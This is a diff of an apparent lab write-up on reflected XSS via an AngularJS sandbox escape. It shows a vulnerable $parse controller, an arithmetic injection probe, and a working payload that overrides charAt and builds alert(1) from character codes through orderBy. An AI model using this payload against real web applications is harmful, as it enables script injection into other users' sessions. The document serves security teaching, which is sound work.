@@ -14,15 +14,14 @@ Reflected Cross-Site Scripting (XSS) via AngularJS sandbox escape
 
 ## Analysis
 
-The application uses AngularJS to process user input:
-
+```javascript
 angular.module('labApp', []).controller('vulnCtrl', function($scope, $parse) {
     $scope.query = {};
     var key = 'search';
     $scope.query[key] = 'test';
     $scope.value = $parse(key)($scope.query);
 });
-
+```
 The input is not directly reflected. Instead, it is processed through AngularJS expressions using {{value}}.
 
 ---
@@ -45,8 +44,9 @@ $scope.value = $parse(key)($scope.query);
 
 We test expression injection using arithmetic:
 
+```bash
 ?search=test&10-2=mohamed
-
+```
 Result:
 The page evaluates the expression and outputs: 8
 
@@ -59,9 +59,10 @@ This confirms AngularJS expression execution.
 AngularJS sandbox restricts dangerous functions like eval().
 
 To bypass this, we override the charAt function:
+```javascript
 
 toString().constructor.prototype.charAt = [].join;
-
+```
 Then we generate payload using ASCII:
 
 x=alert(1)
@@ -73,10 +74,11 @@ Converted to:
 ---
 
 ## Payload
+```javascript
 
 toString().constructor.prototype.charAt%3d[].join;
 [1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)
-
+```
 ---
 
 ## Exploit URL
